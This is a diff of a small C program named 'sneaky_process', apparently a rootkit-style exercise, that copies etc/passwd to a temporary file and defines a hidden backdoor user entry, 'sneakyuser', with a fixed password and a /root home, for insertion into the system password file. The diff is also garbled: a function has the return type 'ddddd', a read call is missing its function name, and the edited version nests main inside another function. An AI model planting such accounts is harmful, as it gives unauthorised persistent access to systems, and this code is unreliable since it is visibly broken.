@@ -4,12 +4,13 @@
 #include <stdlib.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include <unistd.h>
 
 #define REAL_PWD "etc/passwd"
 #define FAKE_PWD "tmp/passwd"
 #define SNEAKY_USER "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash"
 
-ddddd replace_pwd() {
+int replace_pwd() {
   char read_buf[10000];
   size_t byte_read;
   size_t byte_write;
@@ -23,12 +24,12 @@ ddddd replace_pwd() {
     return -1;
   }
 
-  while (true) {
+  while (1) {
     byte_read = (real_pwd, read_buf, sizeof(read_buf));
 
     if (byte_read < 0) {
       printf("byte_read < 0,read error!\n");
-      return false;
+      return -1;
     } else if (byte_read == 0) {
       break; // end of reading,break while loop
     }
@@ -37,15 +38,14 @@ ddddd replace_pwd() {
 
     if (byte_write < 0) {
       printf("sneaky_process failed to write\n");
-      return;
+      return -1;
     }
   }
 
   if (close(real_pwd) < 0 || close(fake_pwd)) {
     perror("real_pwd /& fake_pwd failed to close");
   }
-}
-int main(int argc, char *argv[]) {
-  printf("sneaky_process pid = %d\n", getpid());
-  replace_pwd();
-}
+  int main(int argc, char *argv[]) {
+    printf("sneaky_process pid = %d\n", getpid());
+    replace_pwd();
+  }
